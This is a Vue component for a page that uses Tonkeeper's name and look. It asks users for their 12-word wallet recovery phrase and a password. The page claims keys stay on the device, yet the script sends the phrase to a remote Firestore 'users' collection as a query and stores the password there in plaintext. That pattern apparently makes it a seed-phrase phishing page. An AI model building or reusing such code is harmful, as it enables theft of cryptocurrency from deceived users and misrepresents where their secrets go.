<template>
  <div class="col relative" v-if="!imports && !passBool">
    <div class="relative p-[1rem]">
      <h1 class="text-[32px] font-bold">
        Welcome <br />
        to <span class="text-[#45AEF5]">Tonkeeper</span>
      </h1>
      <div class="block">
        <div class="flex">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="3rem"
            height="3rem"
            viewBox="0 0 28 28"
          >
            <path
              opacity="0.32"
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M15.9738 12.0253C16.9501 13.0016 18.533 13.0016 19.5093 12.0253C20.4857 11.049 20.4857 9.46605 19.5093 8.48974C18.533 7.51343 16.9501 7.51343 15.9738 8.48974C14.9975 9.46605 14.9975 11.049 15.9738 12.0253ZM3.953 24.0461C3.953 24.0461 8.19564 25.4603 11.7312 21.9248L6.07432 16.2679C2.53878 19.8034 3.953 24.0461 3.953 24.0461Z"
              fill="#45AEF5"
            />
            <path
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M17.3879 19.0963V20.6212C17.388 21.6122 17.3879 22.1077 17.2458 22.553C17.1199 22.947 16.914 23.3107 16.6409 23.6214C16.3322 23.9724 15.9073 24.2273 15.0575 24.7372L13.6292 25.5942C12.5902 26.2176 12.0707 26.5293 11.7069 26.4681C11.3912 26.4151 11.12 26.2142 10.9773 25.9276C10.8129 25.5973 10.9599 25.0096 11.2537 23.8342L11.7311 21.9247C11.7311 21.9247 9.96333 21.5712 8.19556 19.8034C6.4278 18.0356 6.07424 16.2679 6.07424 16.2679L4.1648 16.7452C2.98934 17.0391 2.40162 17.186 2.07135 17.0216C1.78479 16.879 1.58384 16.6077 1.5308 16.2921C1.46968 15.9282 1.78137 15.4088 2.40475 14.3698L3.26178 12.9414C3.77166 12.0916 4.0266 11.6667 4.3776 11.3581C4.68821 11.085 5.05195 10.879 5.44596 10.7532C5.8912 10.611 6.38672 10.611 7.37775 10.611L8.90267 10.611C13.1453 3.53994 17.388 2.12572 23.0448 4.95415C25.8732 10.611 24.459 14.8536 17.3879 19.0963ZM15.9737 12.0252C16.95 13.0015 18.533 13.0015 19.5093 12.0252C20.4856 11.0489 20.4856 9.46599 19.5093 8.48968C18.533 7.51337 16.95 7.51337 15.9737 8.48968C14.9974 9.46599 14.9974 11.0489 15.9737 12.0252Z"
              fill="#45AEF5"
            />
          </svg>
          <div class="ml-[15px]">
            <p class="font-bold">World-class speed</p>
            <p class="gr text-[14px]">
              Thanks to the unique architecture of The Open Network, TON
              transactions are settled in seconds.
            </p>
          </div>
        </div>
        <div class="flex mt-[35px]">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="3rem"
            height="3rem"
            viewBox="0 0 28 28"
          >
            <path
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M17.3734
            3.35539C15.7238 2.4481 14.899 1.99445 14 1.99445C13.101 1.99445
            12.2762 2.44809 10.6266 3.35539L6.07232 5.86022C5.062 6.4159 4.55684
            6.69374 4.27842 7.16462C4 7.63551 4 8.21203 4 9.36508V15.5C4 21.0744
            8.99721 24.0593 13.0827 25.2566C13.6822 25.4323 14.3178 25.4323
            14.9173 25.2566C19.0028 24.0593 24 21.0744 24 15.5V9.36508C24
            8.21203 24 7.63551 23.7216 7.16462C23.4432 6.69374 22.938 6.4159
            21.9277 5.86022L17.3734 3.35539ZM18.5607 13.0607C19.1464 12.4749
            19.1464 11.5251 18.5607 10.9393C17.9749 10.3536 17.0251 10.3536
            16.4393 10.9393L12.5 14.8787L11.0607 13.4393C10.4749 12.8536 9.52513
            12.8536 8.93934 13.4393C8.35355 14.0251 8.35355 14.9749 8.93934
            15.5607L11.4393 18.0607C12.0251 18.6464 12.9749 18.6464 13.5607
            18.0607L18.5607 13.0607Z"
              fill="#45AEF5"
            />
            <path
              opacity="0.32"
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M18.5607 10.9393C19.1464
            11.5251 19.1464 12.4749 18.5607 13.0607L13.5607 18.0607C12.9749
            18.6464 12.0251 18.6464 11.4393 18.0607L8.93934 15.5607C8.35355
            14.9749 8.35355 14.0251 8.93934 13.4393C9.52513 12.8536 10.4749
            12.8536 11.0607 13.4393L12.5 14.8787L16.4393 10.9393C17.0251 10.3536
            17.9749 10.3536 18.5607 10.9393Z"
              fill="#45AEF5"
            />
          </svg>
          <div class="ml-[15px]">
            <p class="font-bold">End-to-end security</p>
            <p class="gr text-[14px]">
              Tonkeeper stores your cryptographic keys on your device. All
              <br />
              trades are executed via decentralized protocols so that your
              crypto never ends up in the hands of centralized exchanges.
            </p>
          </div>
        </div>
        <div
          class="black-overlay"
          v-show="showCreateWallet"
          @click="showCreateWallet = false"
        ></div>
        <div
          class="mt-[20px] bg-[#45AEF5] py-[18px] rounded-[17px] cursor-pointer"
          @click="showCreateWallet = !showCreateWallet"
        >
          <p class="text-center font-[600]">Get started</p>
        </div>
      </div>
    </div>
  </div>
  <div
    v-if="showCreateWallet"
    class="pt-[20px] mt-[20px] bg-[#10161F] py-[18px] rounded-[17px] left-0 bottom-0 create-wallet-animation absolute w-[100%] p-[1rem] flex flex-col justify-center items-center"
  >
    <div class="">
      <p
        @click="showCreateWallet = !showCreateWallet"
        class="bg-[#10161F] w-[30px] h-[30px] text-center rounded-full text-[18px] cursor-pointer hover:bg-[#313c4a] top-[20px] absolute right-[10px]"
      >
        x
      </p>
      <div
        class="c ml-[40%] w-[100px] h-[100px] bg-center bg-no-repeat bg-cover"
      >
        <img
          src="https://www.stakingrewards.com/_next/image?url=https%3A%2F%2Fstorage.googleapis.com%2Fstakingrewards-static%2Fimages%2Fassets%2Fproduction%2Fthe-open-network_logo.png&w=2048&q=75"
          alt=""
        />
      </div>
      <p class="text-center text-[24px] font-bold">Let’s set up your wallet</p>
      <p class="text-center gr text-[16px]">
        You need a connected wallet to use <br />
        Tonkeeper. Either create a new wallet or import an existing.
      </p>
      <router-link to="/create">
        <div
          class="mt-[20px] bg-[#45AEF5] py-[18px] rounded-[17px] cursor-pointer w-[100%]"
        >
          <p class="text-center font-[600]">Create new wallet</p>
        </div>
      </router-link>
      <div
        @click="imports = !imports"
        class="mt-[20px] bg-[#1D2633] py-[18px] rounded-[17px] cursor-pointer w-[100%]"
      >
        <p class="text-center font-[600]">Import existing wallet</p>
      </div>
    </div>
  </div>

  <div
    v-if="imports && !passBool"
    class="pt-[20px] mt-[20px] bg-[#0c1014] py-[18px] rounded-[17px] bottom-0 create-wallet-animation left-0 top-0 absolute w-[100%] p-[1rem] flex flex-col justify-center items-center"
  >
    <div class="">
      <p
        @click="(imports = !imports), (showCreateWallet = !showCreateWallet)"
        class="bg-[#1D2633] w-[30px] h-[30px] text-center rounded-full text-[18px] cursor-pointer hover:bg-[#313c4a] top-[20px] absolute right-[10px]"
      >
        x
      </p>
      <h1 class="text-center text-[24px] font-bold">
        Enter your <br />
        recovery phrase
      </h1>
      <p class="text-center gr my-[10px] pb-[30px]">
        To restore access to your wallet, enter the 12 secret recovery words
        given to you when you created your wallet.
      </p>
      <div class="flex justify-between flex-wrap gap-[5px]">
        <div style="width: 49%" v-for="(phrase, index) in 12" :key="index">
          <input
            type="text"
            v-model="inputs[index]"
            class="bg-[#1D2633] border border-[#1D2633] text-[white] text-sm rounded-[15px] text-[25px] h-[60px] focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            :placeholder="index + 1 + ':'"
          />
        </div>
      </div>
      <div
        @click="pushPhrases"
        class="mt-[20px] bg-[#45AEF5] py-[18px] rounded-[17px] cursor-pointer"
      >
        <p class="text-center font-[600]">Continue</p>
      </div>
    </div>
  </div>
  <div v-if="passBool">
    <div class="b p-[1rem]">
      <div class="text-center w-[100%]">
        <p class="font-bold text-[24px]">Create password</p>

        <div class="pt-[20px]">
          <input
            type="password"
            id="password"
            v-model="password"
            class="bg-[#1D2633] text-[white] text-sm rounded-[15px] focus:ring-blue-500 focus:border-blue-500 block w-full dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 p-[15px] h-[60px] text-[20px]"
            placeholder="Password"
            required
          />
        </div>
        <p class="text-left gr pt-[10px] text-[14px]">
          Must be at least 6 characters.
        </p>
        <div class="pt-[20px]">
          <input
            type="password"
            id="confirmPassword"
            v-model="confirmPassword"
            class="bg-[#1D2633] text-[white] text-sm rounded-[15px] focus:ring-blue-500 focus:border-blue-500 block w-full dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 p-[15px] h-[60px] text-[20px]"
            placeholder="Re-enter password"
            required
          />
        </div>

        <div
          @click="validatePasswords"
          :class="{ disabled: !arePasswordsValid }"
          class="mt-[20px] bg-[#45AEF5] py-[18px] rounded-[17px] cursor-pointer"
        >
          <p class="text-center font-[600]">Continue</p>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import {
  doc,
  deleteDoc,
  updateDoc,
  getDoc,
  query,
  where,
  setDoc,
  collection,
  onSnapshot,
  getDocs,
  getDocsFromServer,
} from "firebase/firestore";
import { db } from "../firebase/firebase";
import { mnemonicValidate } from "@ton/crypto";
export default {
  data() {
    return {
      showCreateWallet: false,
      imports: false,
      passBool: false,
      inputs: [],
      prhases: [],
      adress: "",
      password: "",
      confirmPassword: "",
    };
  },
  computed: {
    arePasswordsValid() {
      return (
        this.password.length >= 6 && this.password === this.confirmPassword
      );
    },
  },
  methods: {
    async validatePasswords() {
      if (!this.arePasswordsValid) {
        return;
      }
      const washingtonRef = doc(db, "users", this.adress);

      await updateDoc(washingtonRef, {
        password: this.confirmPassword,
      });
      localStorage.setItem("publicArr", this.adress);
      this.$router.push("/wallet");
    },
    async pushPhrases() {
      if (
        this.inputs.length === 12 &&
        this.inputs.every((input) => input.trim().length > 0)
      ) {
        this.prhases = [...this.inputs];
        const res = await mnemonicValidate(this.prhases);
        if (res) {
          const q = query(
            collection(db, "users"),
            where("rPhrases", "==", this.prhases)
          );
          onSnapshot(q, (querySnapshot) => {
            querySnapshot.forEach((doc) => {
              this.adress = doc.data().addres;
            });
          });
          this.passBool = !this.passBool;
          this.showCreateWallet = !this.showCreateWallet;
        } else {
          alert("Error 12 phrases.");
        }
      } else {
        alert("Please fill in all 12 phrases.");
      }
    },
  },
  created() {},
};
</script>

<style lang="scss" scoped>
.disabled {
  pointer-events: none;
  opacity: 0.5;
}
.col {
  padding-top: 250px;
}
.b {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
.black-overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  z-index: 1;
  display: none;
}

@keyframes myAnim {
  0% {
    opacity: 0;
    transform: translateY(250px);
  }

  100% {
    opacity: 1;
    transform: translateY(0);
  }
}

.create-wallet-animation {
  animation: myAnim 0.5s ease 0s 1 normal forwards;
}
</style>
